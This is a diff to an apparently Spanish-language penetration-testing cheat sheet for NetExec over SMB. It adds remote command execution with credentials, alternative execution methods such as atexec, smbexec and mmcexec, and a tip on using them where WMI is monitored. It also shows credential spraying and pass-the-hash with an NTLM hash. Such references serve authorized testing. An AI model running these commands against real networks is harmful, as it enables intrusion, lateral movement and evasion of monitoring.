@@ -67,6 +67,19 @@ nxc smb 192.168.1.10 -u /ruta/usuarios.txt -p '' -d miempresa.local --user-as-pa
 ```
 >Comprueba mismo usuario y contraseña
 
+## Command execution
+
+```
+nxc smb 192.168.1.50 -u 'admin' -p 'Clave123!' -x 'whoami /all'
+```
+> Ejecutar comandos cambiando el método (Útil si WMI está bloqueado o monitorizado)
+
+```
+nxc smb 192.168.1.50 -u 'admin' -p 'Clave123!' -x 'ipconfig' --exec-method atexec
+```
+
+> Métodos alternativos: atexec (usa tareas programadas), smbexec o mmcexec
+
 ## Pass-the-hash
 ```
 nxc smb 192.168.1.50 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:7afe0344c34e0e4745864c235c03c52e' --local-auth
